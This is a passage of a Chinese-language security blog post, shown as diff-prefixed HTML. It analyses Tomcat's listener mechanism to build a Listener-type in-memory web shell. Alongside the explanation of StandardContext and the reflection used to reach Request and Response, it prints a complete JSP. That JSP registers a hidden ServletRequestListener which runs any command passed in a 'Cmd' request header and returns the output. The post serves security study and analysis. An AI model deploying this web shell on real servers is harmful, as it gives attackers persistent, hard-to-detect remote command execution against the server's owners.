+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">runWorker</span><span class="p">:</span><span class="n">1190</span><span class="p">,</span><span class="w"> </span><span class="n">ThreadPoolExecutor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">threads</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">run</span><span class="p">:</span><span class="n">659</span><span class="p">,</span><span class="w"> </span><span class="n">ThreadPoolExecutor$Worker</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">threads</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">run</span><span class="p">:</span><span class="n">63</span><span class="p">,</span><span class="w"> </span><span class="n">TaskThread$WrappingRunnable</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">threads</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">run</span><span class="p">:</span><span class="n">745</span><span class="p">,</span><span class="w"> </span><span class="n">Thread</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>往回看 Listener 是在<code>StandardContext#fireRequestInitEvent</code>中被调用</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image.png"></p>
+<p>通过 getApplicationEventListeners 得到 instances 数组，再遍历 instances，将其转型为 ServletRequestListener，最后传入 ServletRequestEvent 并调用 requestInitialized  方法。</p>
+<p>看看 getApplicationEventListeners 方法：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%201.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%202.png" alt="image.png"></p>
+<p>可以看到 instances 其实就是获取的 StandardContext 的 applicationEventListenersList 属性，而其本质为 List,。所以我们这里只要想办法控制这一个属性就行。</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%203.png" alt="image.png"></p>
+<p>同时在 StandardContext 中提供了对应的 add 方法。</p>
+<p>所以我们只需要反射获取 StandardContext ，再调用此 add 方法，加入我们自定义的 listener 实例，即可成功加载。</p>
+<h1 id="0x03-获取request和response">0x03 获取Request和Response</h1>
+<p>因为 requestInitialized 只传入了 ServletRequestEvent ，没有类似 doFilter 的 ServletRequest 和 ServletResponse, 所以我们需要手动获取能够达到类似功能的对象。</p>
+<p>所以这里想办法在传入的 ServletRequestEvent 里面做手脚</p>
+<p>查看 ServletRequestEvent 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%204.png" alt="image.png"></p>
+<p>其中的 ServletRequest 为接口, 但因为多态的特性看不出来 request 具体是什么</p>
+<p>下个断点看下：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%205.png" alt="image.png"></p>
+<p>发现是 RequestFacade ，查看一下其定义：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%206.png" alt="image.png"></p>
+<p>RequestFacade 实现了 HttpServletRequest 接口, 到这里其实已经可以正常解析 request 请求了</p>
+<p>现在还差一个 response</p>
+<p>注意到 RequestFacade 存在 request 属性, 声明类型为 Request, 于是查看 Request 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%207.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%208.png" alt="image.png"></p>
+<p>发现其存在 response 属性, 声明类型为 Response</p>
+<p>查看 Response 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%209.png" alt="image.png"></p>
+<p>Response 也实现了 HttpServletResponse 接口, 那么同样的也可以正常处理 response 响应</p>
+<p>其实两者都是 tomcat 内部的对象, 封装了底层的 http 请求, 而 RequestFacade 是 Request 的又一层封装</p>
+<p>利用反射来实现上面获取的过程：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RequestFacade</span><span class="w"> </span><span class="n">requestFacade</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestFacade</span><span class="p">)</span><span class="w"> </span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Field</span><span class="w"> </span><span class="n">requestField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestFacade</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;request&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">requestField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Request</span><span class="p">)</span><span class="w"> </span><span class="n">requestField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">requestFacade</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getResponse</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></div><h1 id="0x04-编写内存马">0x04 编写内存马</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.RequestFacade&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.Request&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.Response&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStream&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span><span class="w"> </span><span class="o">%&gt;&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 获取 StandardContext</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">appctxField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">appctxField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">appctxField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">stdctxField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">stdctxField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">stdctxField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletRequestListener</span><span class="w"> </span><span class="n">servletRequestListener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 获取 request 和 response</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">RequestFacade</span><span class="w"> </span><span class="n">requestFacade</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestFacade</span><span class="p">)</span><span class="w"> </span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Field</span><span class="w"> </span><span class="n">requestField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestFacade</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;request&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">requestField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Request</span><span class="p">)</span><span class="w"> </span><span class="n">requestField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">requestFacade</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Response</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getResponse</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">pw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&#34;Cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">input</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">pw</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">line</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">pw</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 添加 Listener</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addApplicationEventListener</span><span class="p">(</span><span class="n">servletRequestListener</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;inject success&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2010.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2011.png" alt="image.png"></p>
+<h1 id="参考">参考</h1>
+<p><a href="https://exp10it.io/2022/11/tomcat-listener-">https://exp10it.io/2022/11/tomcat-listener-</a>型内存马分析/#获取-request-和-response</p>
+
+    </article>
+
+    
+    <div class="comments">
+  <div class="giscus"></div>
+</div>
+<script 
+  src="https://giscus.app/client.js" 
+  data-repo="dlzmoe/blog" 
+  data-repo-id="R_kgDOJkJvtw"
+  data-category="Announcements" 
+  data-category-id="DIC_kwDOJkJvt84CX9d6" 
+  data-mapping="url" 
+  data-strict="0"
+  data-reactions-enabled="1" 
+  data-emit-metadata="1" 
+  data-input-position="top" 
+  data-theme="light_protanopia"
+  data-lang="zh-CN" 
+  data-loading="lazy" 
+  crossorigin="anonymous" 
+  async>
+</script>
+
+    
+    
+  </section>
+  <footer class="footer">
+  <p>© 2024 - 2024 Powered by
+    <a href="https://github.com/w0s1np" target="_blank">Github</a>
+    / <a href="/index.xml" target="_blank">RSS</a>
+  </p>
+</footer>
+
+
+</body>
+
+</html>
